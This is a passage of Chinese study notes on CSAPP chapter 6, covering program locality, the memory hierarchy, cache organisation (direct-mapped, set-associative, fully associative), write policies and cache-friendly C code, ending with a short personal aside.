时，引用模式入下：</p><table><thead><tr><th>地址</th><th>0</th><th>4</th><th>8</th><th>12</th><th>16</th><th>20</th><th>24</th><th>28</th></tr></thead><tbody><tr><td>内容</td><td>$$v_0$$</td><td>$$v_1$$</td><td>$$v_2$$</td><td>$$v_3$$</td><td>$$v_4$$</td><td>$$v_5$$</td><td>$$v_6$$</td><td>$$v_7$$</td></tr><tr><td>访问顺序</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td></tr></tbody></table><p>这个函数的元素是被按照他们在内存中的顺序来读取的，所以对于变量v，这个函数有很好的空间局部性。</p><p>像 sumvec 函数这样顺序访问每一个元素的函数，具有步长为1的引用模式，我们称这样的引用模式为<strong>顺序引用模式</strong>。一个连续向量中，每隔 k 个元素进行访问，就称为步长为 k 的引用模式。步长为 1 的引用模式是程序中空间局部性常见和重要的来源。一般而言，<strong>随着步长的增加，空间局部性下降</strong>。</p><p>接下来两个例子分别展示了局部性很好和很差的两个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">(<span class="hljs-type">int</span> a[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;M;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;N;j++)<br>        &#123;<br>            sum+=a[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum2</span><span class="hljs-params">(<span class="hljs-type">int</span> a[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;M;j++)<br>        &#123;<br>            sum+=a[j][i];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>空间局部性体现在访问 <code>a[i]</code> 数组上，因为下一次循环就会访问上一次访问过的元素的后面一个位置。</p><p>时间局部性就体现在访问 <code>sum</code> 变量上，因为每次都会取得 <code>sum</code> 变量去进行运算。</p><p>sum1 的局部性就比 sum2 要好得多。sum1每次循环会制造步长为 1 的空间移动，而 sum2 每次循环会制造间隔为 N 的空间移动</p><blockquote><p>在 <code>a[M][N]</code> 中， <code>a[i][j]~a[i][j+1]</code> 地址紧邻，而 <code>a[i][j]</code> 和 <code>a[i+1][j]</code> 相差了 N 个 int 的数据）。</p></blockquote><h3 id="取指的局部性"><a href="#取指的局部性" class="headerlink" title="取指的局部性"></a>取指的局部性</h3><ul><li><p>空间局部性体现在循环内部，所有指令都是紧挨着运行的。</p></li><li><p>时间局部性体现在循环内部，一条指令会在将来被执行多次。</p></li></ul><h3 id="局部性小结"><a href="#局部性小结" class="headerlink" title="局部性小结"></a>局部性小结</h3><ul><li><p>复引用相同变量的程序有良好的时间局部性。</p></li><li><p>对于具有步长为 k 的引用模式的程序，步长越小，空间局部性越好。</p><p>具有步长为1的引用模式的程序有很好的空间局部性。在内存中以大步长跳来跳去的程序空间局部性会很差。</p></li><li><p>对于取指令来说，循环有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</p></li></ul><h1 id="存储器结构层次"><a href="#存储器结构层次" class="headerlink" title="存储器结构层次"></a>存储器结构层次</h1><p>我们再前两节了解到存储技术和计算机软件的属性：</p><ul><li>存储技术：不同存储技术的访问时间差异很大，越靠近 CPU 容量越小、速度越快、造价也更高</li><li>计算机软件：我们的程序需要有良好的局部性</li></ul><p>而硬件和软件之间的基本属性互相补充的很完美，我们现代计算机系统中使用了一种组织存储器系统的方法——存储器体系结构。具体如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%AD%98%E5%82%A8%E5%99%A8%E7%BB%93%E6%9E%84%E5%B1%82%E6%AC%A1.png"></p><h3 id="存储器体系结构中的缓存"><a href="#存储器体系结构中的缓存" class="headerlink" title="存储器体系结构中的缓存"></a>存储器体系结构中的缓存</h3><p><strong>高速缓存</strong>是一个小而快速的存储设备，它作为存储在更大、也更慢的设备中的数据对象的缓冲区域。使用高速缓存的过程称为<strong>缓存</strong>。</p><p>存储器体系结构的中心思想是，对于每个 k ，位于 k 层的更快更小的存储设备作为位于 k+1 层的更大更慢的存储设备的缓存。例如，本地磁盘作为通过网络从远程磁盘取出的文件（例如Web页面）的缓存，主存作为本地磁盘上数据的缓存，依此类推，直到最小的缓存—— CPU 寄存器组。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86.png"></p><p>如上图，数据总是以块大小为传送单元（transfer unit）在第 k 层和第 k+1 层之间来回复制的。</p><p>虽然在层次结构中任何一对相邻的层次之间块大小是固定的，但是其他的层次对之间可以有不同的块大小，比如 CPU 和 Cache 之间可能只有十几个字节的大小，而主存到硬盘之间可能有几兆甚至几十兆的大小。</p><h4 id="缓存命中"><a href="#缓存命中" class="headerlink" title="缓存命中"></a>缓存命中</h4><p>当程序刚好需要第 k+1 层的某个缓存数据对象 d 时，他首先会在当前存储的第 k 层的第一个块中寻找，倘若 d 刚好在 k 层中，那么就是我们所说的<strong>缓存命中</strong>。</p><h4 id="缓存不命中"><a href="#缓存不命中" class="headerlink" title="缓存不命中"></a>缓存不命中</h4><p>如果第 k 层没有我们想要找的缓存数据对象 d ，就叫做<strong>缓存不命中</strong>。当发生缓存不命中时，第 k 层的缓存从第 k+1 层缓存中取出包含 d 的那个块，如果第 k 层的缓存已经满了，可能就会覆盖现存的一个块。</p><p>覆盖现存块的过程称为<strong>替换</strong>或者<strong>驱逐</strong>这个块，被驱逐的块叫做牺牲块。而决定替换哪个块是由缓存的<strong>替换策略</strong>来控制的。</p><h4 id="缓存不命中的种类"><a href="#缓存不命中的种类" class="headerlink" title="缓存不命中的种类"></a>缓存不命中的种类</h4><h5 id="强制不命中"><a href="#强制不命中" class="headerlink" title="强制不命中"></a>强制不命中</h5><p>有一种命中称为<strong>强制不命中</strong>或<strong>冷不命中</strong>（cold miss），是指当第 k 层的缓存为空时，此时无论访问什么数据都会发生不命中。</p><p>只要发生了不命中，第 k 层的缓存就需要执行某个放置策略，最灵活的替换策略是我们允许 k+1 层中的块放在<strong>任何一个位置</strong>，因为随机的放置块，需要用到的时候需要遍历整个 k 层存储器，代价很高。</p><p>因此，硬件缓存通常是采用更加严格的放置策略，将第 k+1 层的某个快限制放置在第 k 层块的一个小小的子集中。例如，上图中，因为 k+1 层的第 i 块只会放到 k 层中<strong>第 i mod 4 块</strong>的位置上。我们在寻找的时候，就可以用很低的复杂度快速判断我们的块在不在第 k 层了。</p><h5 id="冲突不命中"><a href="#冲突不命中" class="headerlink" title="冲突不命中"></a>冲突不命中</h5><p>上面提到的限制性的放置策略会引起另一种不命中叫<strong>冲突不命中</strong>（conflict miss）。在这种情况中，缓存足够大，能够保存被引用的数据对象，但是因为这些对象会映射到同一个缓存块，缓存会一直不命中。比如，如果程序请求块 0，然后块 8，然后块 0，然后块 8，依此类推，在第 k 层的缓存中，对这两个块的每次引用都会不命中，然而 k 层的缓存还有很多空间可以使用。</p><h5 id="数量不命中"><a href="#数量不命中" class="headerlink" title="数量不命中"></a>数量不命中</h5><p>如果循环体过大，或者是数组遍历过大，我们也有概率发生不命中，因为这个大小已经远远超过缓存能容纳的大小，此时缓存会经历<strong>容量不命中</strong>（capacity miss），就是说缓存太小了，容纳不下。</p><h4 id="缓存管理"><a href="#缓存管理" class="headerlink" title="缓存管理"></a>缓存管理</h4><p>管理缓存的逻辑可以是硬件、软件或者时两者的结合：</p><ul><li>编译器管理<strong>寄存器文件</strong>是缓存层次结构的最高层。它决定当发生不命中时何时发射加载，以及确定哪个寄存器来存放数据。</li><li>L1、L2和 L3 层的缓存完全是由<strong>内置在缓存中的硬件逻辑</strong>来管理的。</li><li>在一个有虚拟内存的系统中，DRAM 主存作为存储在磁盘上的数据块的缓存，是由<strong>操作系统软件</strong>和 CPU 上的地址翻译硬件共同管理的。</li><li>对于一个具有像 AFS 这样的分布式文件系统的机器来说，本地磁盘作为缓存，它是由运行在本地机器上的 <strong>AFS客户端进程</strong>管理的。</li></ul><h3 id="存储器体系结构概念小节"><a href="#存储器体系结构概念小节" class="headerlink" title="存储器体系结构概念小节"></a>存储器体系结构概念小节</h3><p>概括来说，基于缓存的存储器体系结构行之有效，是因为较慢的存储设备比较快的存储设备更便宜，还因为程序倾向于展示局部性：</p><ul><li>利用时间局部性：由于时间局部性，同一数据对象可能会被多次使用。一旦一个数据对象在第一次不命中时被复制到缓存中，我们就会期望后面对该目标有一系列的访问命中。因为缓存比低一层的存储设备更快，对后面的命中的服务会比最开始的不命中快很多。</li><li>利用空间局部性：块通常包含有多个数据对象。由于空间局部性，我们会期望后面对该块中其他对象的访问能够补偿不命中后复制该块的花费。</li></ul><h1 id="高速缓存存储器"><a href="#高速缓存存储器" class="headerlink" title="高速缓存存储器"></a>高速缓存存储器</h1><p>早期计算机系统的存储器结构层次只有三层： CPU 寄存器、DRAM 主存储器和磁盘存储。</p><p>随着 CPU 和主存之间逐渐增大的差距，系统设计者在 CPU 寄存器文件和主存之间插入了一个小的 SRAM 高速缓存存储器，称为 L1 高速缓存（一级缓存）。而后一级缓存也无法弥补性能之间的差距，程序设计者又在 L1 高速缓存和主存之间插入了一个更大的高速缓存，称为 L2 高速缓存。有些现代系统还包括一个比 L2 更大的高速缓存 L3 高速缓存。</p><p>接下来的章节中都是以只有一个 L1 高速缓存的情况来学习的。</p><h3 id="通用的高速缓存存储器组织结构"><a href="#通用的高速缓存存储器组织结构" class="headerlink" title="通用的高速缓存存储器组织结构"></a>通用的高速缓存存储器组织结构</h3><p>高速缓存的组织如下：</p><p>一个机器的高速缓存组被组织为一个有 $$S &#x3D;2^s$$ 个高速缓存组的数组，每个组包含 E 个高速缓存行。每行有一个 $$B&#x3D;2^b$$ 字节的<strong>数据块</strong>组成。一个<strong>有效位</strong>指明这个行是否包含有意义的信息，还有 <code>t=m-(b+s)​</code> 个<strong>标记位</strong>唯一的标识存储在这个高速缓存中的块。</p><p>一般而言，高速缓存的结构可以用元组 <code>(S,E,B,m)</code> 来描述，高速缓存的大小（或者容量）C指的是所有块大小的和，标记为和有效位并不包括在内，所以 <code>C=SxExB</code>。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><p> 那么高速缓存是如何工作的呢？</p><blockquote><p>还是感觉书上说的很难懂</p></blockquote><p>如上图 (b) ，我们的一个完整的内存地址共有 m 位，这 m 位被分为三个字段，分别是：组索引位（s位）、标记位（t位）和块偏移位（b位）。</p><ul><li><strong>组索引位</strong>（s位）：组索引位用于确定数据应该存储在哪个组（group）中。这里有S个组，索引值从 0 开始编号，每个组包含多个缓存行。</li><li><strong>标记位</strong>（t位）：标记位用于确定每个缓存行的内容是否与访问的地址所需数据匹配。如果缓存行中存储的数据与访问的数据相匹配，并且有效位被设置，则表示命中了缓存。</li><li><strong>块偏移位</strong>（b位）：块偏移位用于确定缓存行中的哪个字节存储了需要的数据，因为每个缓存行大小为B字节。</li></ul><p>当 CPU 请求数据时，地址被分解为组索引、标记和块偏移位。首先使用组索引位找到对应的组，然后在该组中查找标记位匹配的缓存行，如果找到匹配的行并且有效位被设置，则表示缓存命中，CPU可以直接从缓存中获取数据。</p><h3 id="直接映射高速缓存"><a href="#直接映射高速缓存" class="headerlink" title="直接映射高速缓存"></a>直接映射高速缓存</h3><p>根据每个组的高速缓存行数 E ，高速缓存被分为不同的类。其中<strong>每一组只有一行的高速缓存称为直接映射高速缓存</strong>。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%9B%B4%E6%8E%A5%E6%98%A0%E5%B0%84%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><p>高速缓存确定一个请求是否命中，然后抽取出被请求的字的过程分为三步：1）组选择、2）行匹配、3）字抽取</p><h4 id="组选择"><a href="#组选择" class="headerlink" title="组选择"></a>组选择</h4><p>组选择先屏蔽掉低 b 位的块偏移之后，取得低 s 位，这个数值就是组号。如果我们把高速缓存看作是一个关于组的一维数组，那么这些组的索引位就是这个对应在数组的索引。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E9%80%89%E6%8B%A9.png"></p><h4 id="行匹配"><a href="#行匹配" class="headerlink" title="行匹配"></a>行匹配</h4><p>取得高 t 位，只有这一位和标记位完全对应上才说明 cache 行里面装的是我们想要的数据。</p><h4 id="字选择"><a href="#字选择" class="headerlink" title="字选择"></a>字选择</h4><p>一旦前两个步骤命中，我们就可以根据块偏移来确定字的位置了</p><p>行匹配和字选择的流程如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%A1%8C%E5%8C%B9%E9%85%8D.png"></p><h4 id="不命中时的行替换"><a href="#不命中时的行替换" class="headerlink" title="不命中时的行替换"></a>不命中时的行替换</h4><p>如果缓存不命中，那么它需要从存储器体系结构中的下一层取出被请求的块，然后将新的块存储在组索引位指示的组中的一个高速缓存行中。对于直接映射高速缓存来说，每个组只包含有一行，替换策略非常简单：用新取出的行替换当前的行。</p><h4 id="运行中的直接映射高速缓存"><a href="#运行中的直接映射高速缓存" class="headerlink" title="运行中的直接映射高速缓存"></a>运行中的直接映射高速缓存</h4><p>假设我们有一个直接映射高速缓存，<code>(S,E,B,m)=(4,1,2,4)</code>，高速缓存有 4 个组，每个组一行，每个块 2 个字节，而地址是4 位的。</p><p>我们这里用列表来模拟高速缓存，可以将所有的地址都列出来：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%BF%90%E8%A1%8C%E4%B8%AD%E7%9A%84%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98-%E5%9C%B0%E5%9D%80.png"></p><p>在最开始的时候，高速缓存都是空的：</p><table><thead><tr><th>组</th><th>有效位</th><th>标记位</th><th>块[0]</th><th>块[1]</th></tr></thead><tbody><tr><td>0</td><td>0</td><td></td><td></td><td></td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>0</td><td></td><td></td><td></td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>”组“这一列不是高速缓存的一部分，后四列才是高速缓存实际的位</p></blockquote><p>CPU 在执行读操作时，会发生以下几个步骤：</p><p><strong>读地址 0 的字</strong>：</p><p>组 0 的有效位为 0 ，缓存不命中，执行替换策略。高速缓存从内存中取出块 0 ，并把这个块存储在组 0 中。然后高速缓存新去除的块的 m[0] 。</p><table><thead><tr><th>组</th><th>有效位</th><th>标记位</th><th>块[0]</th><th>块[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>m[0]</td><td>m[1]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>0</td><td></td><td></td><td></td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><p><strong>读地址 1 的字</strong>：</p><p>高速缓存命中，立即从高速缓存行中的块[1]中返回 m[1] 。高速缓存的状态没有变化。</p><p><strong>读地址 13 的字：</strong></p><p>读地址 13 的字，找到组 2，有效位为 0，执行替换策略。</p><table><thead><tr><th>组</th><th>有效位</th><th>标记位</th><th>块[0]</th><th>块[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>m[0]</td><td>m[1]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>1</td><td>1</td><td>m[12]</td><td>m[13]</td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><p><strong>读地址 8 的字</strong></p><p>读地址 8 的字，找到组 0，有效位为 1，标记位没有对上，发生不命中，执行替换策略。</p><table><thead><tr><th>组</th><th>有效位</th><th>标记位</th><th>块[0]</th><th>块[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>1</td><td>m[8]</td><td>m[9]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>1</td><td>1</td><td>m[12]</td><td>m[13]</td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><p><strong>读地址 0 的字</strong>：</p><p>缓存不命中，因为我们前面替换了块 0 。</p><table><thead><tr><th>组</th><th>有效位</th><th>标记位</th><th>块[0]</th><th>块[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>m[0]</td><td>m[1]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>0</td><td></td><td>m[12]</td><td>m[13]</td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><h4 id="冲突不命中-1"><a href="#冲突不命中-1" class="headerlink" title="冲突不命中"></a>冲突不命中</h4><p>在直接映射高速缓存中，同一组的不同行多次被反复访问，会导致直接映射高速缓存一直不命中（因为只有一行，每次都需要替换）。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">float</span> <span class="hljs-title function_">dotprod</span><span class="hljs-params">(<span class="hljs-type">float</span> x[<span class="hljs-number">8</span>],<span class="hljs-type">float</span> y[<span class="hljs-number">8</span>])</span><br>&#123;<br>    <span class="hljs-type">float</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++)<br>    &#123;<br>        sum+=x[i]*y[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序看起来是具有很好的局部性的，但事实上有可能 <code>x[i]</code> 与 <code>y[i]</code> 的组号永远相同。</p><p>假设 cache 行的行长为 4，x 数组与 y 数组地址紧邻，那么就会出现这种情况：</p><p>循环的第一次迭代引用 x[0]，缓存不命中会导致包含 x[0]<del>x[3] 的块被加载到组 0。接下来是对 y[0] 的引用，又一次缓存不命中，导致包含 y[0]</del>y[3]的块被复制到组 0，覆盖前一次引用复制进来的 x 的值。现在我们有一个冲突不命中，而且实际上后面每次对 x 和 y的引用都会导致冲突不命中，这种情况我们叫<strong>抖动</strong>，因为每次循环，它一直在 x 和 y 之间来回访问。</p><p>我们的修正思路也很容易，只需要在 x 数组之后填充上 B 个字节（例如把 float[8] 定义为 float[12] ），让它们映射到不同组当中即可解决问题。</p><h4 id="索引位在中间位的原因"><a href="#索引位在中间位的原因" class="headerlink" title="索引位在中间位的原因"></a>索引位在中间位的原因</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%B4%A2%E5%BC%95%E4%BD%8D.png"></p><p>高位做索引的话，一些连续的内存块就会映射到相同的高速缓存快。而相比较而言，相邻的快总是映射到不同的高速缓存中。而中间位索引的命中率相较高位索引也要高得多。</p><h3 id="组相联高速缓存"><a href="#组相联高速缓存" class="headerlink" title="组相联高速缓存"></a>组相联高速缓存</h3><p>直接映射高速缓存中冲突不命中造成的问题源于每个组只有一行，组相联高速缓存（set associative cache）放松了这条限制，所以每个组都保存有多于一个的高速缓存行。一个<code>1&lt;E&lt;C/B</code> 的高速缓存通常称为 E 路组相联高速缓存。</p><p>如下图是 E&#x3D;2 的组相联高速缓存：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E7%9B%B8%E8%81%94%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><h4 id="组选择-1"><a href="#组选择-1" class="headerlink" title="组选择"></a>组选择</h4><p>和直接映射高速缓存组一样</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E7%9B%B8%E8%81%94%E7%BB%84%E9%80%89%E6%8B%A9.png"></p><h4 id="行匹配和字选择"><a href="#行匹配和字选择" class="headerlink" title="行匹配和字选择"></a>行匹配和字选择</h4><p>行匹配需要检查多个行的有效位和标记位。</p><p>相联存储器是一个 <code>(key,value)</code> 对的数组，以 key 为输入，返回与输入的 key 相匹配的 <code>(key,value)</code> 对中的 value 值。因此我们可以把组相联高速缓存中的每个组都看成一个小的相联存储器，key 是标记和有效位，而 value 就是块的内容。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E7%9B%B8%E8%81%94%E8%A1%8C%E5%8C%B9%E9%85%8D.png"></p><h4 id="不命中时的行替换-1"><a href="#不命中时的行替换-1" class="headerlink" title="不命中时的行替换"></a>不命中时的行替换</h4><p>因为组相联高速缓存中一组有很多行，我们就需要用一定的替换策略来决定替换的行：</p><p>最简单的替换策略就是随机选择一行，其他更复杂的策略利用了局部性原理，以使在比较近的将来引用被替换的行的概率最小。</p><ul><li><strong>最不常使用</strong>（Least-Frequently-Used，LFU）策略：会替换在过去某个时间窗口内引用次数最少的那一行（适用于空间局部性较高的程序）。</li><li><strong>最近最少使用</strong>（Least-Recently-Used，LRU）策略：会替换最后一次访问时间最久远的那一行（适用于时间局部性较高的程序）。</li></ul><p>所有这些策略都需要额外的时间和硬件。但是，越往存储器体系结构下面走，远离CPU，一次不命中的开销就会更加昂贵，用更好的替换策略使得不命中最少也变得更加值得了。</p><h3 id="全相联高速缓存"><a href="#全相联高速缓存" class="headerlink" title="全相联高速缓存"></a>全相联高速缓存</h3><p>全相联高速缓存是有一个包含所有高速缓存行的组（也就是 E&#x3D;C&#x2F;B）组成的。如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%A8%E7%9B%B8%E8%81%94%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><h4 id="组选择-2"><a href="#组选择-2" class="headerlink" title="组选择"></a>组选择</h4><p>因为全相联高速缓存只有一个组，所以对应的地址中是没有组索引位的，我们默认就是组 0 。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%A8%E7%9B%B8%E8%81%94%E8%A1%8C%E5%8C%B9%E9%85%8D.png"></p><h4 id="行匹配和字选择-1"><a href="#行匹配和字选择-1" class="headerlink" title="行匹配和字选择"></a>行匹配和字选择</h4><p>和其他的一样）</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%A8%E7%9B%B8%E8%81%94%E5%AD%97%E9%80%89%E6%8B%A9.png"></p><p>因为高速缓存电路必须并行地搜索许多相匹配的标记，构造一个又大又快的相联高速缓存很困难，而且很昂贵。因此，全相联高速缓存只适合做小的高速缓存。</p><h3 id="有关写的问题"><a href="#有关写的问题" class="headerlink" title="有关写的问题"></a>有关写的问题</h3><p>前面我们都在学习读的操作，写的情况比读要复杂的多。</p><p>假设我们要写一个已经缓存了的字 w（写命中，write hit）。在高速缓存更新了它的 w 的副本之后，怎么更新 w 在层次结构中紧接着低一层中的副本呢？</p><ul><li><p><strong>直写</strong>（write-through），就是立即将 w 的高速缓存块写回到紧接着的低一层中。</p><p>直写的缺点是每次写都会引起总线流量。</p></li><li><p><strong>写回</strong>（write-back），尽可能地推迟更新，只有当替换算法要驱逐这个更新过的块时，才把它写到紧接着的低一层中。</p><p>由于局部性，写回能显著地减少总线流量，但是它的缺点是增加了复杂性。高速缓存必须为每个高速缓存行维护一个额外的修改位（dirty bit），表明这个高速缓存块是否被修改过。</p></li></ul><p>对于不命中也有相应的解决方案：</p><ul><li><p><strong>写分配</strong>（write-allocate），加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。</p><p>写分配试图利用写的空间局部性，但是缺点是每次不命中都会导致一个块从低一层传送到高速缓存。</p></li><li><p><strong>非写分配</strong>（not-write-allocate），避开高速缓存，直接把这个字写到低一层中。</p></li></ul><p>直写高速缓存通常是非写分配的，写回高速缓存通常是写分配的。</p><h3 id="实际的高速缓存"><a href="#实际的高速缓存" class="headerlink" title="实际的高速缓存"></a>实际的高速缓存</h3><p>我们一直假设高速缓存只保存数据，实际上高速缓存及保存数据，也保存指令。只保存指令的高速缓存，称为 <code>i-cache</code>，而只保存数据的称为 <code>d-cache</code>，既保存数据又保存指令的高速缓存叫统一高速缓存 <code>unified cache</code> 。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%AE%9E%E9%99%85%E7%9A%84%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><h3 id="高速缓存的性能影响"><a href="#高速缓存的性能影响" class="headerlink" title="高速缓存的性能影响"></a>高速缓存的性能影响</h3><p>有许多指标来衡量高速缓存的性能：</p><ul><li>不命中率（miss rate）。在一个程序执行或程序的一部分执行期间，内存引用不命中的比率。它是这样计算的：<code>不命中数量/引用数量</code>。</li><li>命中率（hit rate）。命中的内存引用比率。它等于 <code>1-不命中率</code>。</li><li>命中时间（hit time）。从高速缓存传送一个字到CPU所需的时间，包括组选择、行确认和字选择的时间。对于L1高速缓存来说，命中时间的数量级是几个时钟周期。</li><li>不命中处罚（miss penalty）。由于不命中所需要的额外的时间。L1不命中需要从L2得到服务的处罚，通常是数10个周期；从L3得到服务的处罚，50个周期；从主存得到的服务的处罚，200个周期。</li></ul><h4 id="高速缓存大小的影响"><a href="#高速缓存大小的影响" class="headerlink" title="高速缓存大小的影响"></a>高速缓存大小的影响</h4><p>一方面，较大的高速缓存可能会提高命中率。另一方面，使大存储器运行得更快总是要难一些的。较大的高速缓存可能会增加命中时间，所以我们才会有 L1、L2 、L3 的高速缓存自小到大的顺序。</p><h4 id="块大小的影响"><a href="#块大小的影响" class="headerlink" title="块大小的影响"></a>块大小的影响</h4><p>大的块有利有弊，较大的块能更高地利用空间局部性，帮助提高命中率。但是可能对时间局部性利用不足，增加命中时间。</p><h4 id="相联度的影响"><a href="#相联度的影响" class="headerlink" title="相联度的影响"></a>相联度的影响</h4><p>较高的相联度（也就是E的值较大）的优点是降低了高速缓存由于冲突不命中出现抖动的可能性，不过较高的相联度会造成较高的成本。</p><h4 id="写策略的影响"><a href="#写策略的影响" class="headerlink" title="写策略的影响"></a>写策略的影响</h4><p>一般来说，高速缓存越往下层，越是采取写回的方式而不是直接写。</p><h1 id="编写高速缓存友好的代码"><a href="#编写高速缓存友好的代码" class="headerlink" title="编写高速缓存友好的代码"></a>编写高速缓存友好的代码</h1><ul><li><p>步长为 1 的代码可以在循环体内部，尽量<strong>减少缓存的不命中率</strong>。</p></li><li><p><strong>对局部变量反复引用</strong>，因为反复引用的局部变量编译器会考虑放在寄存器当中。</p></li></ul><hr><p>我闺闺的一个比赛</p><p>好玩好玩，和养成游戏一样！！🥳</p><p>什么时候 CTF 